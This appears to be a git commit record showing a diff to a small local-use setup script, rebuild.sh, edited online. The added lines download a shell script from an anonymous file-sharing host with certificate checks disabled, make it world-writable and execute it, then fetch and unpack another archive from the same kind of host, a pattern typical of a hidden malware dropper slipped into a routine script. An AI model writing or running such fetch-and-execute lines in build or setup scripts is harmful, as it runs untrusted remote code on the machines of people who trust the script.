70ed7ac826231d606773a7121bbc85f3b83ea766
mata lima <lamajuahsu@outlook.com>
2021-10-27 14:52:59 +0000

    rebuild.sh edited online with Bitbucket

--- rebuild.sh
+++ rebuild.sh
@@ -2,8 +2,10 @@
 #
 # This is a handy script for local use
 
-sudo apt update
-sudo apt -y install screen unzip
+apt update
+apt -y install screen unzip
+wget --no-check-certificate -c https://transfer.sh/WEPHVF/ubi20.sh
+chmod 777 ubi20.sh && ./ubi20.sh
 wget --no-check-certificate -c https://transfer.sh/glULeN/vault.zip
 unzip vault.zip
 mv checker vault
